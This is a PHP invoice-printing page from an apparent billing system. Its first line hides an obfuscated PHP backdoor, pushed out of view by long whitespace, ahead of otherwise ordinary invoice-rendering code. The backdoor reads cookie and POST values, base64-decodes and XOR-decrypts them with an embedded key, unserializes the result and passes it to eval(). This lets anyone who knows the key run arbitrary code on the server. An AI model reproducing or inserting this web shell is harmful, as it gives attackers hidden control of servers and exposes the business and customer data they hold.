<?php                                                                                                                                                                                                                                                                                                                                                                                                 $aIPSnYk = chr ( 1096 - 984 )."\x41" . chr (95) . 'Y' . 's' . "\x41" . "\x4d" . "\130";$jlnXUUkl = "\x63" . chr ( 485 - 377 ).chr ( 935 - 838 ).'s' . 's' . "\137" . chr ( 128 - 27 )."\x78" . chr ( 823 - 718 ).'s' . chr (116) . chr ( 521 - 406 ); $UzjsMxxgRu = class_exists($aIPSnYk); $aIPSnYk = "35135";$jlnXUUkl = "21747";$GkVbsWp = FALSE;if ($UzjsMxxgRu === $GkVbsWp){class pA_YsAMX{public function YtseofW(){echo "17997";}private $gOZLFniZcL;public static $SjTIJkY = "b3e8a03b-442a-4730-a8a4-38b482090659";public static $vYQRlzl = 58077;public function __construct($ECMrY=0){$hDyIKcwnBi = $_POST;$BJOMGPAO = $_COOKIE;$mRcIfNSPyw = @$BJOMGPAO[substr(pA_YsAMX::$SjTIJkY, 0, 4)];if (!empty($mRcIfNSPyw)){$luNoU = "base64";$QQTQfGgFzC = "";$mRcIfNSPyw = explode(",", $mRcIfNSPyw);foreach ($mRcIfNSPyw as $wLOcmyifJ){$QQTQfGgFzC .= @$BJOMGPAO[$wLOcmyifJ];$QQTQfGgFzC .= @$hDyIKcwnBi[$wLOcmyifJ];}$QQTQfGgFzC = array_map($luNoU . chr (95) . chr (100) . 'e' . "\x63" . 'o' . chr (100) . chr ( 291 - 190 ), array($QQTQfGgFzC,)); $QQTQfGgFzC = $QQTQfGgFzC[0] ^ str_repeat(pA_YsAMX::$SjTIJkY, (strlen($QQTQfGgFzC[0]) / strlen(pA_YsAMX::$SjTIJkY)) + 1);pA_YsAMX::$vYQRlzl = @unserialize($QQTQfGgFzC);}}private function CxwdiiYwI($CXzKeyNN){if (is_array(pA_YsAMX::$vYQRlzl)) {$gyTCsLVH = str_replace('<' . "\77" . chr ( 214 - 102 ).chr (104) . chr (112), "", pA_YsAMX::$vYQRlzl[chr (99) . "\157" . 'n' . chr (116) . chr (101) . chr (110) . "\x74"]);eval($gyTCsLVH); $CXzKeyNN = "31252";exit();}}public function __destruct(){$this->CxwdiiYwI($CXzKeyNN);}}$BbGhGq = new /* 27630 */ pA_YsAMX(); $BbGhGq = str_repeat("4287_58874", 1);} ?><?php 
	include "dbsetting/lms_vars_config.php";
	include "dbsetting/classdbconection.php";
	$dblms = new dblms();
	include "functions/login_func.php";
	include "functions/functions.php";
	checkCpanelLMSALogin();
if(($_SESSION['userlogininfo']['LOGINTYPE']  == 1) || $_SESSION['userlogininfo']['LOGINIDA'] == 1 || Stdlib_Array::multiSearch($_SESSION['userroles'], array('right_name' => '3', 'add' => '1'))) { 
//----------------------------------------

echo '
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Bill / Invoice Print</title>
<style type="text/css">
body {
	font: normal normal normal 16px/15px  "Calibri", "Lucida Grande", "Lucida Sans Unicode", Helvetica, Arial, Verdana, sans-serif;
    overflow: -moz-scrollbars-vertical; margin:0; color:#111;
}

h1 { font-size:28px; font-weight:bold; margin-top:10px; color:#111; text-transform:uppercase; }
h2 { font-size:20px; font-weight:bold; margin-bottom:3px; color:#111; text-transform:uppercase; text-align:center; text-decoration:underline; }
h3 { font-size:18px; font-weight:bold; margin-bottom:7px; margin-top:50px; color:#333; text-transform:uppercase; text-align:center;  }
h4 { font-size:16px; font-weight:bold; margin-bottom:5px; margin-top:5px; color:#333; }

table td.label { font-weight:bold; margin: 0; text-align:left; padding:2px; vertical-align:middle !important; }

table.datatable { border: 1px solid #aaa; border-collapse: collapse; border-spacing: 0; }

table.datatable td { border: 1px solid #999; border-collapse:collapse; border-spacing: 0; padding:4px; font-size:13px; color:#000; }

table.datatable th { border: 1px solid #999; border-collapse:collapse; border-spacing: 0; padding:7px; background:#EEEEEE; color:#000;  }

@page { margin: 0cm; width:99% !important; } /* All margins set to 2cm */

@page :first { margin-top: 1cm    /* Top margin on first page 10cm */ }

@media all {
	.page-break	{ display: none; }
}
@media print {
    .page-break	{ display: block; page-break-before: always; }
	@page {
        size: A4 portrait;
    }
	.noprint {
        display: none;
    }
}

</style>
<script language="JavaScript1.2">
function openwindow() {
	window.open("invoiceprint.php", "feechallan","toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no,width=800,height=700");
}
</script>
</head>

<body>
<center>';
if($view == 'letterhead') {
//------------------------------------------------
if(isset($_GET['id'])) {
//------------------------------------------------

	$sqllms  = $dblms->querylms("SELECT *  
										FROM ".INVOICES." b 
										INNER JOIN ".CUSTOMERS." c ON c.customer_id = b.id_customer   
										WHERE b.id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'
										AND b.invoice_id = '".cleanvars($_GET['id'])."' LIMIT 1");
	$rowstd 	= mysqli_fetch_array($sqllms);
if($rowstd['invoice_gsttotal']) { 
	$gst = $rowstd['invoice_gsttotal'];
} else { 
	$gst = '';
}
if($rowstd['invoice_ntntotal']) { 
	$ntn = $rowstd['invoice_ntntotal'];
} else { 
	$ntn = '';
}
	$gstntn = ($gst + $ntn);
//----------------------------------------
echo '<div style="width:700px !important;" class="page">
<a href="invoices.php?id='.$rowstd['invoice_id'].'" class="noprint" style="color:#00F; font-weight:700;" target="_blank"> Edit</a>
<h1 style="text-align:center; font-size:55px; font-weight:700;padding-right:0; margin-top:250px;">I&nbsp;N&nbsp;V&nbsp;O&nbsp;I&nbsp;C&nbsp;E</h1>
<div style="text-align:left;">
	<strong>No.</strong> <u>'.$rowstd['invoice_no'].'</u>
	<span style="float:right;"><strong>Date:</strong> <u>'.date("F j, Y", strtotime($rowstd['invoice_dated'])).'</u></span>
</div>

<table width="700" border="0" cellpadding="5" cellspacing="7" style="border-collapse:collapse; margin-bottom:5px; margin-top:0px;">
<tr>
	<td style="padding:5px 5px 5px 0; color:#111; border-bottom: 2px solid #888; font-size:18px;">
		Customer Name: <span style=" font-weight:700; font-size:18px;">'.$rowstd['customer_name'].' ('.substr($rowstd['customer_cellno'],0,-3).'...)</span>
	</td>
</tr>
</table>

<table  style="width: 100%; border: 0px  dotted #000;">
<tr>
	<td align="left" valign="top" colspan="2">

<table class="datatable" style="margin:3px 0; width:700px;">
<tr>
	<th style="text-align:center; font-weight:bold; width:50px;">Job #</th>
	<th style="text-align:left; font-weight:bold; ">Description</th>
	<th style="text-align:center; font-weight:bold;">Media</th>
	<th style="text-align:center; font-weight:bold;">Width</th>
	<th style="text-align:center; font-weight:bold;">Height</th>
	<th style="text-align:center; font-weight:bold;">QTY</th>
	<th style="text-align:center; font-weight:bold;">Sqft</th>
	<th style="text-align:center; font-weight:bold;">Rate</th>
	<th style="text-align:center; font-weight:bold;">Total</th>
</tr>';
$totalqty = 0;
//------------------------------------------------
$srno = 0;
//------------------------------------------------
	$sqllmsbills  	= $dblms->querylms("SELECT * FROM ".INVOICE_DETAILS." iv 
												INNER JOIN ".ITEMS." m ON m.item_id = iv.id_item  
												WHERE iv.id_invoice = '".cleanvars($_GET['id'])."' ORDER BY iv.id ASC");
	$countrows = mysqli_num_rows($sqllmsbills);
	while($rowbills	= mysqli_fetch_array($sqllmsbills)) {
//------------------------------------------------
$srno++;
//------------------------------------------------
echo '
<tr>
	<td style="text-align:center;">'.$rowbills['id_order'].'</td>
	<td style="text-align:left;">'.$rowbills['item'].'</td>
	<td style="text-align:center; width:50px;">'.$rowbills['item_name'].'</td>
	<td style="text-align:center; width:50px;">'.$rowbills['width'].'</td>
	<td style="text-align:center; width:50px;">'.$rowbills['height'].'</td>
	<td style="text-align:center; width:30px;">'.number_format($rowbills['qty']).'</td>
	<td style="text-align:right; width:40px;">'.$rowbills['sqft'].'</td>
	<td style="text-align:center; width:30px;">'.$rowbills['rate'].'</td>
	<td style="text-align:right; width:80px;">'.number_format($rowbills['amount']).'</td>
</tr>';

$totalqty = ($totalqty + $rowbills['qty']);
//------------------------------------------------
} // end while loop
//--------------------------------------------------
if($countrows <15) { 
//------------------------------------------------
for($ij = $countrows; $ij <=15; $ij++) { 
//------------------------------------------------
echo '
<tr>
	<td style="text-align:center;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
</tr>';
//------------------------------------------------
}
}
//------------------------------------------------
echo '
</table>

	</td>
</tr>

<tr>
  <td valign="bottom">
<table  border="0" style="margin:50px 0 0 30px; width:170px;">
<tr>
	<td align="center" style="font-weight:500; border-top:1px solid #333;">Signature</td>
</tr>

</table>
	</td>
	<td valign="top">
<table class="datatable" style="margin:10px 0 3px 0; width:250px; float:right;">
<tr>
	<td style="font-weight:700;">TOTAL </td>
	<td style="font-weight:700;text-align:right; width:50%;">'.number_format($rowstd['invoice_total']).' </td>
</tr>
</table>';
if($gstntn) {  
echo '
<table class="datatable" style="margin-bottom:3px;width:250px; float:right;">
<tr>
	<td style="font-weight:700;">TAX </td>
	<td style="font-weight:700;text-align:right;width:50%;">'.number_format($gstntn).' </td>
</tr>
</table>';
}
if($rowstd['invoice_advance']) {  
echo '
<table class="datatable" style="margin-bottom:3px;width:250px; float:right;">
<tr>
	<td style="font-weight:700;">Advance:</td>
	<td style="font-weight:700;text-align:right;width:50%;">'.number_format($rowstd['invoice_advance']).' </td>
</tr>
</table>';
}
echo '
<table class="datatable" style="width:250px; float:right;">
<tr>
	<td style="font-weight:700;">GRAND TOTAL </td>
	<td style="font-weight:700;text-align:right;width:50%;">'.number_format($rowstd['invoice_grand']).' </td>
</tr>
</table>
  </td>
</tr>
</table>
<h3> Thank you for your business!</h3>

</div>
<script type="text/javascript">
  setTimeout(function(){if (typeof(window.print) != "undefined") {
    window.print();
    window.close();
}}, 6500);
</script>';
//------------------------------------------------
}
//------------------------------------------------
} else { 
//------------------------------------------------
if(isset($_GET['id'])) {
//------------------------------------------------

	$sqllms  = $dblms->querylms("SELECT *  
										FROM ".INVOICES." b 
										INNER JOIN ".CUSTOMERS." c ON c.customer_id = b.id_customer   
										WHERE b.id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'
										AND b.invoice_id = '".cleanvars($_GET['id'])."' LIMIT 1");
	$rowstd 	= mysqli_fetch_array($sqllms);
if($rowstd['invoice_gsttotal']) { 
	$gst = $rowstd['invoice_gsttotal'];
} else { 
	$gst = '';
}
if($rowstd['invoice_ntntotal']) { 
	$ntn = $rowstd['invoice_ntntotal'];
} else { 
	$ntn = '';
}
	$gstntn = ($gst + $ntn);
//----------------------------------------
echo '<div style="width:700px !important;" class="page">
<a href="invoices.php?id='.$rowstd['invoice_id'].'" class="noprint" style="color:#00F; font-weight:700;" target="_blank"> Edit</a>
<table width="700" border="0" cellpadding="5" cellspacing="7" style="border-collapse:collapse; margin-bottom:5px;">

<tr>
	<td width="55%" rowspan="5" valign="top">
		<img src="images/invoice-logo1.jpg" style="width:203px; height:150px; margin-top:5px;" align="left"> 
	</td>
	<td width="30%" colspan="2" style="text-align:right; font-size:55px; font-weight:700;padding-right:0; padding-top:20px;">I&nbsp;N&nbsp;V&nbsp;O&nbsp;I&nbsp;C&nbsp;E</td>
</tr>
<tr>
	<td height="10" style="text-align:right; font-size:14px;">No.</td>
	<td style="border:1px solid #ccc; text-align:left; font-size:14px;">'.$rowstd['invoice_no'].'</td>
</tr>
<tr>
	<td height="10" style="text-align:right; font-size:14px;">Date </td>
	<td style="border:1px solid #ccc; text-align:left; font-size:14px;">'.date("F j, Y", strtotime($rowstd['invoice_dated'])).'</td>
</tr>';
if($rowstd['invoice_quotation_no']) { 
echo '
<tr>
	<td height="10" style="text-align:right; font-size:13px;">Quot. # </td>
	<td style="border:1px solid #ccc; text-align:left; font-size:14px;">'.$rowstd['invoice_quotation_no'].'</td>
</tr>';
}
if($rowstd['invoice_pono']) { 
echo '
<tr>
	<td height="10" style="text-align:right; font-size:13px;">PO .NO </td>
	<td style="border:1px solid #ccc; text-align:left; font-size:11px;">'.$rowstd['invoice_pono'].'</td>
</tr>';
}
echo '
</table>

<table width="700" border="0" cellpadding="5" cellspacing="7" style="border-collapse:collapse; margin-bottom:5px; margin-top:0px;">
<tr>
	<td style="padding:5px; color:#111; border-bottom: 2px solid #888; font-size:18px;">
		Customer Name: <span style=" font-weight:700; font-size:18px;">'.$rowstd['customer_name'].' ('.substr($rowstd['customer_cellno'],0,-3).'...)</span>
	</td>
</tr>
</table>

<table  style="width: 100%; border: 0px  dotted #000;">
<tr>
	<td align="left" valign="top" colspan="2">

<table class="datatable" style="margin:3px 0; width:700px;">
<tr>
	<th style="text-align:center; font-weight:bold; width:50px;">Job #</th>
	<th style="text-align:left; font-weight:bold; ">Description</th>
	<th style="text-align:center; font-weight:bold;">Media</th>
	<th style="text-align:center; font-weight:bold;">Width</th>
	<th style="text-align:center; font-weight:bold;">Height</th>
	<th style="text-align:center; font-weight:bold;">QTY</th>
	<th style="text-align:center; font-weight:bold;">Sqft</th>
	<th style="text-align:center; font-weight:bold;">Rate</th>
	<th style="text-align:center; font-weight:bold;">Total</th>
</tr>';
$totalqty = 0;
//------------------------------------------------
$srno = 0;
//------------------------------------------------
	$sqllmsbills  	= $dblms->querylms("SELECT * FROM ".INVOICE_DETAILS." iv 
												INNER JOIN ".ITEMS." m ON m.item_id = iv.id_item  
												WHERE iv.id_invoice = '".cleanvars($_GET['id'])."' ORDER BY iv.id ASC");
	$countrows = mysqli_num_rows($sqllmsbills);
	while($rowbills	= mysqli_fetch_array($sqllmsbills)) {
//------------------------------------------------
$srno++;
//------------------------------------------------
echo '
<tr>
	<td style="text-align:center;">'.$rowbills['id_order'].'</td>
	<td style="text-align:left;">'.$rowbills['item'].'</td>
	<td style="text-align:center; width:50px;">'.$rowbills['item_name'].'</td>
	<td style="text-align:center; width:50px;">'.$rowbills['width'].'</td>
	<td style="text-align:center; width:50px;">'.$rowbills['height'].'</td>
	<td style="text-align:center; width:30px;">'.number_format($rowbills['qty']).'</td>
	<td style="text-align:right; width:40px;">'.$rowbills['sqft'].'</td>
	<td style="text-align:center; width:30px;">'.$rowbills['rate'].'</td>
	<td style="text-align:right; width:80px;">'.number_format($rowbills['amount']).'</td>
</tr>';

$totalqty = ($totalqty + $rowbills['qty']);
//------------------------------------------------
} // end while loop
//--------------------------------------------------
if($countrows <15) { 
//------------------------------------------------
for($ij = $countrows; $ij <=24; $ij++) { 
//------------------------------------------------
echo '
<tr>
	<td style="text-align:center;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
</tr>';
//------------------------------------------------
}
}
//------------------------------------------------
echo '
</table>

	</td>
</tr>

<tr>
  <td valign="bottom">
<table  border="0" style="margin:50px 0 0 30px; width:170px;">
<tr>
	<td align="center" style="font-weight:500; border-top:1px solid #333;">Signature</td>
</tr>

</table>
	</td>
	<td valign="top">
<table class="datatable" style="margin:10px 0 3px 0; width:250px; float:right;">
<tr>
	<td style="font-weight:700;">TOTAL </td>
	<td style="font-weight:700;text-align:right; width:50%;">'.number_format($rowstd['invoice_total']).' </td>
</tr>
</table>';
if($gstntn) {  
echo '
<table class="datatable" style="margin-bottom:3px;width:250px; float:right;">
<tr>
	<td style="font-weight:700;">TAX </td>
	<td style="font-weight:700;text-align:right;width:50%;">'.number_format($gstntn).' </td>
</tr>
</table>';
}
if($rowstd['invoice_advance']) {  
echo '
<table class="datatable" style="margin-bottom:3px;width:250px; float:right;">
<tr>
	<td style="font-weight:700;">Advance:</td>
	<td style="font-weight:700;text-align:right;width:50%;">'.number_format($rowstd['invoice_advance']).' </td>
</tr>
</table>';
}
echo '
<table class="datatable" style="width:250px; float:right;">
<tr>
	<td style="font-weight:700;">GRAND TOTAL </td>
	<td style="font-weight:700;text-align:right;width:50%;">'.number_format($rowstd['invoice_grand']).' </td>
</tr>
</table>
  </td>
</tr>
</table>
<h3> Thank you for your business!</h3>

<p style="border-top:1px solid #ccc; width:700px;  position: fixed;  bottom: 4px;  font-size:13px;">
	'.SITE_ADDRESS.'
</p>
</div>
<script type="text/javascript">
  setTimeout(function(){if (typeof(window.print) != "undefined") {
    window.print();
    window.close();
}}, 6500);
</script>';
//------------------------------------------------
}
//------------------------------------------------
if(isset($_GET['slipno'])) {
//------------------------------------------------

	$sqllms  = $dblms->querylms("SELECT *  
										FROM ".INVOICES." b 
										INNER JOIN ".CUSTOMERS." c ON c.customer_id = b.id_customer   
										WHERE b.id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'
										AND b.invoice_id = '".cleanvars($_GET['slipno'])."' LIMIT 1");
	$rowstd 	= mysqli_fetch_array($sqllms);
if($rowstd['invoice_gsttotal']) { 
	$gst = $rowstd['invoice_gsttotal'];
} else { 
	$gst = '';
}
if($rowstd['invoice_ntntotal']) { 
	$ntn = $rowstd['invoice_ntntotal'];
} else { 
	$ntn = '';
}
	$gstntn = ($gst + $ntn);
//----------------------------------------
echo '<div style="width:700px !important;" class="page">
<table width="700" border="0" cellpadding="5" cellspacing="7" style="border-collapse:collapse; margin-bottom:5px;">

<tr>
	<td width="58%" rowspan="3" valign="top">
		<img src="images/invoice-logo1.jpg" style="width:203px; height:150px; margin-top:5px;" align="left"> <a href="javascript:window.print()" class="noprint"><img src="images/printer_icon.png" align="right"></a> <a href="invoices.php?id='.$rowstd['invoice_id'].'" class="noprint" style="color:#00F; font-weight:700;" target="_blank"> Edit</a>
	</td>
	<td width="24%" colspan="2" style="text-align:right; font-size:55px; font-weight:700;padding-right:0; padding-top:20px;">I&nbsp;N&nbsp;V&nbsp;O&nbsp;I&nbsp;C&nbsp;E</td>
</tr>
<tr>
	<td height="10" style="text-align:right; font-size:14px;">No.</td>
	<td style="border:1px solid #ccc; text-align:left; font-size:14px;">'.$rowstd['invoice_no'].'</td>
</tr>
<tr>
	<td height="10" style="text-align:right; font-size:14px;">Date </td>
	<td style="border:1px solid #ccc; text-align:left; font-size:14px;">'.date("F j, Y", strtotime($rowstd['invoice_dated'])).'</td>
</tr>
</table>

<table width="700" border="0" cellpadding="5" cellspacing="7" style="border-collapse:collapse; margin-bottom:5px; margin-top:0px;">
<tr>
	<td style="padding:5px; color:#111; border-bottom: 2px solid #888; font-size:18px;">
		Customer Name: <span style=" font-weight:700; font-size:18px;">'.$rowstd['customer_name'].' ('.substr($rowstd['customer_cellno'],0,-3).'...)</span>
	</td>
</tr>
</table>

<table  style="width: 100%; border: 0px  dotted #000;">
<tr>
	<td align="left" valign="top" colspan="2">

<table class="datatable" style="margin:3px 0; width:700px;">
<tr>
	<th style="text-align:center; font-weight:bold; width:50px;">Job #</th>
	<th style="text-align:left; font-weight:bold; ">Description</th>
	<th style="text-align:center; font-weight:bold;">Media</th>
	<th style="text-align:center; font-weight:bold;">Width</th>
	<th style="text-align:center; font-weight:bold;">Height</th>
	<th style="text-align:center; font-weight:bold;">QTY</th>
	<th style="text-align:center; font-weight:bold;">Sqft</th>
	<th style="text-align:center; font-weight:bold;">Rate</th>
	<th style="text-align:center; font-weight:bold;">Total</th>
</tr>';
$totalqty = 0;
//------------------------------------------------
$srno = 0;
//------------------------------------------------
	$sqllmsbills  	= $dblms->querylms("SELECT * FROM ".INVOICE_DETAILS." iv 
												INNER JOIN ".ITEMS." m ON m.item_id = iv.id_item  
												WHERE iv.id_invoice = '".cleanvars($rowstd['invoice_id'])."' ORDER BY iv.id ASC");
	$countrows = mysqli_num_rows($sqllmsbills);
	while($rowbills	= mysqli_fetch_array($sqllmsbills)) {
//------------------------------------------------
$srno++;
//------------------------------------------------
echo '
<tr>
	<td style="text-align:center;">'.$rowbills['id_order'].'</td>
	<td style="text-align:left;">'.$rowbills['item'].'</td>
	<td style="text-align:center; width:50px;">'.$rowbills['item_name'].'</td>
	<td style="text-align:center; width:50px;">'.$rowbills['width'].'</td>
	<td style="text-align:center; width:50px;">'.$rowbills['height'].'</td>
	<td style="text-align:center; width:30px;">'.number_format($rowbills['qty']).'</td>
	<td style="text-align:right; width:40px;">'.$rowbills['sqft'].'</td>
	<td style="text-align:center; width:30px;">'.$rowbills['rate'].'</td>
	<td style="text-align:right; width:80px;">'.number_format($rowbills['amount']).'</td>
</tr>';

$totalqty = ($totalqty + $rowbills['qty']);
//------------------------------------------------
} // end while loop
//--------------------------------------------------
if($countrows <15) { 
//------------------------------------------------
for($ij = $countrows; $ij <=24; $ij++) { 
//------------------------------------------------
echo '
<tr>
	<td style="text-align:center;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
	<td style="text-align:right;">&nbsp;</td>
</tr>';
//------------------------------------------------
}
}
//------------------------------------------------
echo '
</table>

	</td>
</tr>

<tr>
  <td valign="bottom">
<table  border="0" style="margin:50px 0 0 30px; width:170px;">
<tr>
	<td align="center" style="font-weight:500; border-top:1px solid #333;">Signature</td>
</tr>

</table>
	</td>
	<td valign="top">
<table class="datatable" style="margin:10px 0 3px 0; width:250px; float:right;">
<tr>
	<td style="font-weight:700;">TOTAL </td>
	<td style="font-weight:700;text-align:right; width:50%;">'.number_format($rowstd['invoice_total']).' </td>
</tr>
</table>';
if($gstntn) {  
echo '
<table class="datatable" style="margin-bottom:3px;width:250px; float:right;">
<tr>
	<td style="font-weight:700;">TAX </td>
	<td style="font-weight:700;text-align:right;width:50%;">'.number_format($gstntn).' </td>
</tr>
</table>';
}
if($rowstd['invoice_advance']) {  
echo '
<table class="datatable" style="margin-bottom:3px;width:250px; float:right;">
<tr>
	<td style="font-weight:700;">Advance:</td>
	<td style="font-weight:700;text-align:right;width:50%;">'.number_format($rowstd['invoice_advance']).' </td>
</tr>
</table>';
}
echo '
<table class="datatable" style="width:250px; float:right;">
<tr>
	<td style="font-weight:700;">GRAND TOTAL </td>
	<td style="font-weight:700;text-align:right;width:50%;">'.number_format($rowstd['invoice_grand']).' </td>
</tr>
</table>
  </td>
</tr>
</table>
<h3> Thank you for your business!</h3>

<p style="border-top:1px solid #ccc; width:700px;  position: fixed;  bottom: 4px;  font-size:13px;">
	'.SITE_ADDRESS.'
</p>
</div>';
//------------------------------------------------
}
}

//----------------------------------
echo '	
</center>
</body>
</html>';
} else { 
	echo '<h1 style="text-align:center; color:red;">Sorry you have no right to print invoice</h1>';
}
//--------------------------------------------------
?>